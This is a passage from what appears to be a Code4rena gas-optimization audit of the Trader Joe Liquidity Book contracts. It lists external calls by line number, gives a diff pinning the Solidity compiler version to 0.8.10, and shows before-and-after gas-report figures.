src/LBFactory.sol  /// @audit factory() 216:          if (ILBPair(_LBPairImplementation).factory() != this)  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L216  ```solidity File: src/LBQuoter.sol  /// @audit getPair() 77:               quote.pairs[i] = IJoeFactory(factoryV1).getPair(_route[i], _route[i + 1]);  /// @audit getAllLBPairs() 94:               ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapOut() 105:                              ILBRouter(routerV2).getSwapOut(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getPair() 156:              quote.pairs[i - 1] = IJoeFactory(factoryV1).getPair(_route[i - 1], _route[i]);  /// @audit getAllLBPairs() 171:              ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapIn() 181:                              ILBRouter(routerV2).getSwapIn(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getReserves() 223:          (uint256 reserve0, uint256 reserve1, ) = IJoePair(_pair).getReserves();  /// @audit mulShiftRoundDown() 240:              quote = BinHelper.getPriceFromId(_activeId, _binStep).mulShiftRoundDown(_amount, Constants.SCALE_OFFSET);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L77  ```solidity File: src/LBRouter.sol  /// @audit getReserves() 718:                  (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();  /// @audit tokenX() 727:                  (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);  /// @audit getReserves() 788:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 792:                          IJoePair(_pair).swap(0, amountOut, _recipient, \"\");  /// @audit swap() 795:                          IJoePair(_pair).swap(amountOut, 0, _recipient, \"\");  /// @audit tokenY() 798:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 800:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit swap() 843:                          IJoePair(_pair).swap(0, amountOut, _recipient, \"\");  /// @audit swap() 845:                          IJoePair(_pair).swap(amountOut, 0, _recipient, \"\");  /// @audit tokenY() 848:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 850:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit getReserves() 888:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 893:                          IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");  /// @audit swap() 898:                          IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");  /// @audit swap() /// @audit tokenY() 901:                      ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L718  ```solidity File: src/libraries/BinHelper.sol  /// @audit power() 44:               return _getBPValue(_binStep).power(_realId);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BinHelper.sol#L44  ```solidity File: src/libraries/TokenHelper.sol  /// @audit call() 28:               (bool success, bytes memory result) = address(token).call(  /// @audit call() 46:               (bool success, bytes memory result) = address(token).call(  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TokenHelper.sol#L28  ```diff diff --git a/src/LBFactory.sol b/src/LBFactory.sol index 32ee39c..df9d1c7 100644 --- a/src/LBFactory.sol +++ b/src/LBFactory.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/proxy/Clones.sol\";  import \"openzeppelin/utils/structs/EnumerableSet.sol\"; diff --git a/src/LBQuoter.sol b/src/LBQuoter.sol index 53fdf0c..e9f9815 100644 --- a/src/LBQuoter.sol +++ b/src/LBQuoter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"./LBErrors.sol\";  import \"./libraries/BinHelper.sol\"; diff --git a/src/LBRouter.sol b/src/LBRouter.sol index 567c49a..532cc13 100644 --- a/src/LBRouter.sol +++ b/src/LBRouter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/IERC20.sol\";   diff --git a/src/libraries/BinHelper.sol b/src/libraries/BinHelper.sol index db0fef8..c6cf99c 100644 --- a/src/libraries/BinHelper.sol +++ b/src/libraries/BinHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"../LBErrors.sol\";  import \"./Math128x128.sol\"; diff --git a/src/libraries/TokenHelper.sol b/src/libraries/TokenHelper.sol index 17d8e23..3391a98 100644 --- a/src/libraries/TokenHelper.sol +++ b/src/libraries/TokenHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/IERC20.sol\";   diff --git a/test/LBPair.t.sol b/test/LBPair.t.sol index d84bb5b..550d55a 100644 --- a/test/LBPair.t.sol +++ b/test/LBPair.t.sol @@ -1,5 +1,5 @@  // SPDX-License-Identifier: UNLICENSED -pragma solidity 0.8.7; +pragma solidity 0.8.10;    import \"./TestHelper.sol\";   diff --git a/test/mocks/ERC20.sol b/test/mocks/ERC20.sol index 0543ab8..4cabd37 100644 --- a/test/mocks/ERC20.sol +++ b/test/mocks/ERC20.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/ERC20.sol\";   diff --git a/test/mocks/ERC20MockDecimals.sol b/test/mocks/ERC20MockDecimals.sol index b952b88..95d1797 100644 --- a/test/mocks/ERC20MockDecimals.sol +++ b/test/mocks/ERC20MockDecimals.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/ERC20.sol\";   diff --git a/test/mocks/ERC20MockDecimalsOwnable.sol b/test/mocks/ERC20MockDecimalsOwnable.sol index 081940f..7ca3b95 100644 --- a/test/mocks/ERC20MockDecimalsOwnable.sol +++ b/test/mocks/ERC20MockDecimalsOwnable.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/ERC20.sol\";  import \"openzeppelin/access/Ownable.sol\"; diff --git a/test/mocks/ERC20WithTransferTax.sol b/test/mocks/ERC20WithTransferTax.sol index 7a7a1f4..269616d 100644 --- a/test/mocks/ERC20WithTransferTax.sol +++ b/test/mocks/ERC20WithTransferTax.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/ERC20.sol\";   diff --git a/test/mocks/Faucet.sol b/test/mocks/Faucet.sol index 108bde7..e00e8fd 100644 --- a/test/mocks/Faucet.sol +++ b/test/mocks/Faucet.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"../../src/libraries/PendingOwnable.sol\";  import \"../../src/libraries/TokenHelper.sol\"; diff --git a/test/mocks/FlashloanBorrower.sol b/test/mocks/FlashloanBorrower.sol index 16817a8..2bfe335 100644 --- a/test/mocks/FlashloanBorrower.sol +++ b/test/mocks/FlashloanBorrower.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/interfaces/IERC20.sol\";   diff --git a/test/mocks/WAVAX.sol b/test/mocks/WAVAX.sol index fd86df0..0ff59a0 100644 --- a/test/mocks/WAVAX.sol +++ b/test/mocks/WAVAX.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import \"openzeppelin/token/ERC20/ERC20.sol\";   ```  ```diff diff --git a/tmp/gas_before b/tmp/gas_after index f6d4cb0..3e4d40b 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -5,3 +5,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 2086657                              \u2506 10631           \u2506        \u2506        \u2506        \u2506         \u2502 +\u2502 2083650                              \u2506 10616           \u2506        \u2506        \u2506        \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -59,3 +59,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 setLBPairImplementation              \u2506 1524            \u2506 24536  \u2506 25108  \u2506 25108  \u2506 147     \u2502 +\u2502 setLBPairImplementation              \u2506 1396            \u2506 24408  \u2506 24980  \u2506 24980  \u2506 147     \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -68,3 +68,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 4835641                        \u2506 24410           \u2506         \u2506         \u2506          \u2506         \u2502 +\u2502 4823808                        \u2506 24344           \u2506         \u2506         \u2506          \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -74,9 +74,9 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 balanceOfBatch                 \u2506 3766            \u2506 7101    \u2506 5769    \u2506 11769    \u2506 3       \u2502 +\u2502 balanceOfBatch                 \u2506 3513            \u2506 6936    \u2506 5648    \u2506 11648    \u2506 3       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 burn                           \u2506 11235           \u2506 111199  \u2506 107074  \u2506 244666   \u2506 14      \u2502 +\u2502 burn                           \u2506 11185           \u2506 111009  \u2506 106900  \u2506 244223   \u2506 14      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 collectFees                    \u2506 6720            \u2506 27696   \u2506 20481   \u2506 44969    \u2506 7       \u2502 +\u2502 collectFees                    \u2506 6659            \u2506 27637   \u2506 20420   \u2506 44908    \u2506 7       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 collectProtocolFees            \u2506 5620            \u2506 8817    \u2506 9349    \u2506 10952    \u2506 4       \u2502 +\u2502 collectProtocolFees            \u2506 5517            \u2506 8708    \u2506 9247    \u2506 10824    \u2506 4       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -88,3 +88,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 flashLoan                      \u2506 24674           \u2506 55799   \u2506 24674   \u2506 118050   \u2506 3       \u2502 +\u2502 flashLoan                      \u2506 24546           \u2506 55415   \u2506 24546   \u2506 117154   \u2506 3       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -108,3 +108,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 mint                           \u2506 6892            \u2506 1402686 \u2506 1389693 \u2506 14398451 \u2506 216     \u2502 +\u2502 mint                           \u2506 6889            \u2506 1401974 \u2506 1389110 \u2506 14394628 \u2506 216     \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -112,5 +112,5 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 pendingFees                    \u2506 4041            \u2506 12049   \u2506 12853   \u2506 22185    \u2506 8       \u2502 +\u2502 pendingFees                    \u2506 3980            \u2506 11987   \u2506 12792   \u2506 22076    \u2506 8       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 safeBatchTransferFrom          \u2506 3251            \u2506 408394  \u2506 319740  \u2506 1394600  \u2506 25      \u2502 +\u2502 safeBatchTransferFrom          \u2506 2997            \u2506 408204  \u2506 319642  \u2506 1394156  \u2506 25      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -122,3 +122,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 swap                           \u2506 22475           \u2506 50419   \u2506 30217   \u2506 341090   \u2506 318     \u2502 +\u2502 swap                           \u2506 22347           \u2506 50291   \u2506 30089   \u2506 340962   \u2506 318     \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -141,3 +141,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 1899867                            \u2506 9873            \u2506       \u2506        \u2506       \u2506         \u2502 +\u2502 1862779                            \u2506 9669            \u2506       \u2506        \u2506       \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -149,5 +149,5 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 findBestPathFromAmountIn           \u2506 1033            \u2506 45266 \u2506 45438  \u2506 88927 \u2506 5       \u2502 +\u2502 findBestPathFromAmountIn           \u2506 1021            \u2506 44110 \u2506 44256  \u2506 86575 \u2506 5       \u2502  